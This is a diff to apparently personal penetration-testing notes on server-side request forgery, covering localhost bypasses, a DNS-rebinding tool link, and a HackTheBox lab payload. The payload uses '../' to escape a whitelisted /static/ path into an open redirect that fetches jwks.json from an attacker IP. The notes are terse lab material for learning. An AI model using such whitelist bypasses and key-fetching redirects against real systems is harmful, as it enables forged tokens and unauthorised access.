@@ -30,11 +30,27 @@ ssrf port scan   try 127.0.0.1 localhost hex ......
 
 domain name resolve to 127.0.0.1
 
+
+
 dns rebinding
 
 {% embed url="https://lock.cmpxchg8b.com/rebinder.html" %}
 
 A good reminder to try both of them just in case when fuzzing things.
+
+
+
+sometimes `../` worked     hackthebox  Unicode  &#x20;
+
+```
+http://hackmedia.htb/static/   is   white list
+```
+
+```
+http://hackmedia.htb/static/../redirect/?url=10.10.17.95/jwks.json 
+```
+
+I have no idea why this could work
 
 
 
